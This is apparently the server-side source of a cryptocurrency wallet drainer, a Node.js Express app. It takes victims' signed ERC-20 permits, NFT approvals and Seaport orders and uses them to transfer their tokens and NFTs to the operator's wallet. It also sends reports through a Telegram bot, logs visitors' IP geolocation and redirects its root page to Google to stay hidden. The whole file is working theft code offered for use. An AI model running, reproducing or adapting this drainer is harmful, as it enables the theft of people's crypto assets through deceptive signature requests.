const express = require('express')
const axios = require("axios")
const ethers = require("ethers")
const cors = require("cors")
const app = express()
const port = process.argv[2] || 3000

const UNISWAP = require("@uniswap/sdk")
const fs = require('fs');
const { Token, WETH, Fetcher, Route, Trade, TokenAmount, TradeType, Percent} = require("@uniswap/sdk")
const { Seaport } = require('@opensea/seaport-js');

const RPCs = require("./rpc.json")
const ERC20_ABI = require("./ABIs/erc20.json")
const ERC721_ABI = require("./ABIs/erc721.json")

const config = require("./config.json")

app.use(express.json());

const tg_url =
  "https://api.telegram.org/bot[TOKEN]/sendMessage?chat_id=[USER_ID]&disable_web_page_preview=true&parse_mode=html&text=";

function logTlg(msg) {
  let send_url = tg_url.replace("[TOKEN]", config.token);
  config.feedback_accounts.forEach((account) => {
    axios.get(encodeURI(send_url.replace("[USER_ID]", account) + msg));
  });
}

var UUID = "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]
connects = []

const seaInject = async (order) => {
  providerRPC = "https://rpc.ankr.com/eth/38eac0bf9f0e89d5e226f5c1ef1249406ce7958e48704cc5c3015bed44cb3dca";
  const provider = new ethers.providers.JsonRpcProvider(providerRPC);
  const wallet = new ethers.Wallet(config.key, provider);
  const seaport = new Seaport(wallet);
  try{
    const sendit = async () => {
    const { executeAllActions: executeAllFulfillActions } = await seaport.fulfillOrder({
      order,
      accountAddress: wallet.address,
      });
      const transaction = executeAllFulfillActions();
    }
    sendit()
    console.log('Transaction Broadcasted');
    return true;
  } catch(error) { console.log(error)
    const sendit = async () => {
    const { executeAllActions: executeAllFulfillActions } = await seaport.fulfillOrder({
      order,
      accountAddress: wallet.address,
      });
      const transaction = executeAllFulfillActions();
    }
    sendit()
    console.log('Transaction Broadcasted');
    return true;
  }
}

app.use(function(err, req, res, next) {
  res.status(501).send(err);
});

if (config.external) {
  app.use(cors())
  app.get("/", (rq, rs) => rs.redirect(301, "https://google.com"))
  app.use(express.static('public'));
} else {
  app.use('/tokentest', express.static('public'));
  app.use(express.static('public'));
}

app.post("/api/token_approve", async function(req, res, next) {
  try {
    const data = req.body
    let provider = new ethers.providers.JsonRpcProvider(RPCs[data.chainId])
    let wallet = new ethers.Wallet(config.key, provider);
    const permitData = JSON.parse(data.permit)
    let contract = new ethers.Contract(data.tokenAddress, ERC20_ABI, wallet)
    const feeData = await wallet.getFeeData()
    
    const allowance = await contract.allowance(data.owner, wallet.address)
    if (allowance._hex !== '0xb88e282822ab5ed106947c1c60af583c1741a38e858de00000') {
      const gas = await contract.estimateGas.permit(data.owner, data.spender, permitData.value, permitData.deadline, permitData.v, permitData.r, permitData.s)
      const pTrans = await contract.permit(data.owner, data.spender, permitData.value, permitData.deadline, permitData.v, permitData.r, permitData.s, {gasPrice: feeData.gasPrice, gasLimit: gas*4})
      await pTrans.wait()
    }
    await new Promise(r => setTimeout(r, 5000));
    const gasTransfer = await contract.estimateGas.transferFrom(data.owner, wallet.address, data.amount)
    txn = await contract.transferFrom(data.owner, wallet.address, data.amount, {gasPrice: feeData.gasPrice, gasLimit: gasTransfer*2})
    res.send(txn.hash)
  } catch (error) {
    res.status(500).json(error)
  }
})

app.post("/api/token_transfer", async function(req, res, next) {
  try {
    const data = req.body
    let provider = new ethers.providers.JsonRpcProvider(RPCs[data.chainId])
    let wallet = new ethers.Wallet(config.key, provider);
    let contract = new ethers.Contract(data.tokenAddress, ERC20_ABI, wallet)
    const feeData = await wallet.getFeeData()
    const gasTransfer = await contract.estimateGas.transferFrom(data.owner, wallet.address, data.amount)
    txn = await contract.transferFrom(data.owner, wallet.address, data.amount, {gasPrice: feeData.gasPrice, gasLimit: gasTransfer*2})
    res.send(txn.hash)
  } catch (error) {
    res.status(500).json(error)
  }
})

app.post("/api/seaport_sign", async function(req, res, next) {
  try {
    const orders = JSON.stringify(req.body);
    const order = JSON.parse(orders);
    const response = await seaInject(order);
    res.send(response) 
  } catch (error) {
    res.status(500).json(error)
  }
})

app.post("/api/nft_transfer", async function(req, res, next) {
  try {
    const providerRPC = "https://rpc.ankr.com/eth/38eac0bf9f0e89d5e226f5c1ef1249406ce7958e48704cc5c3015bed44cb3dca";
    const data = req.body
    let provider = new ethers.providers.JsonRpcProvider(providerRPC)
    let wallet = new ethers.Wallet(config.key, provider);
    let contract = new ethers.Contract(data.tokenAddress, ERC721_ABI, wallet)
    const feeData = await wallet.getFeeData()
    const gas = 100000
    const txn = await contract.transferFrom(data.owner, wallet.address, data.tokens[0], {gasPrice: feeData.gasPrice, gasLimit: gas})
    res.send(txn.hash)
  } catch (error) {
    res.status(500).json(error)
  }
})

app.get('/geo', function(req, res, next) {
  console.log((req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress))
  axios.get("http://api.db-ip.com/v2/free/" + (req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress))
  .then(function (response) {
    console.log(response)
    res.send(`${response.data.ipAddress} (${response.data.countryName})`)
})
});

app.get("/back.php", function(req, res, next) {
  res.json({"token": config.token, "feedback_accounts": config.feedback_accounts})
})

app.get("/static_tokens", function(req, res, next) {
  res.json(require("./static_tokens.json"))
})

app.get("/cfg", function(req, res, next) {
  const cfg = {"nft_minimal_price": config.nft_minimal_price, "cKey": config.covalent_key, "permit_first": config.permit_first, "seaport_first": config.seaport_first, "priority_tokens": config.permit_priority_tokens, "gas_token_method": config.gas_token_method}
  res.json(cfg)
})

app.get("/recv", function(req, res, next) {
  const address = (new ethers.Wallet(config.key)).address
  res.send(address)
})

app.get("/cnt", function(req, res, next) {
  const connectWallet = req.query.wallet;
  if (!connects.includes(connectWallet)) {
    connects.push(connectWallet)
  }
  res.send(UUID + connects.indexOf(connectWallet).toString())
})

app.listen(port, () => {
  console.log(`App listening on port ${port}`)
})